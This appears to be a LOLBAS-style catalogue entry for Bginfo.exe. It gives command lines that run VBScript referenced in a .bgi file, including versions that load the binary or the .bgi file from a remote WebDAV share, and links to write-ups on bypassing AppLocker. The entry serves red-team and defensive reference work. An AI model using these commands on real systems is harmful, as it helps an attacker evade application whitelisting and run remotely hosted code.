## Bginfo.exe
```

bginfo.exe bginfo.bgi /popup /nolicprompt
Execute VBscript code that is referenced within the bginfo.bgi file.

"\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
Execute bginfo.exe from a WebDAV server.

"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
This style of execution may not longer work due to patch.
```
* Windows binary: False   
* Bypasses Default AppLocker Rules: False   
* Mitre: []()   
   
* Links:   
  * https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
  * https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/
  * https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
   
* File path:   
  * 
   
* Acknowledgement:   
  * Name: Oddvar Moe
    * Twitter: [@oddvarmoe](https://twitter.com/@oddvarmoe)
    * Blog: https://oddvar.moe
   
OS:  
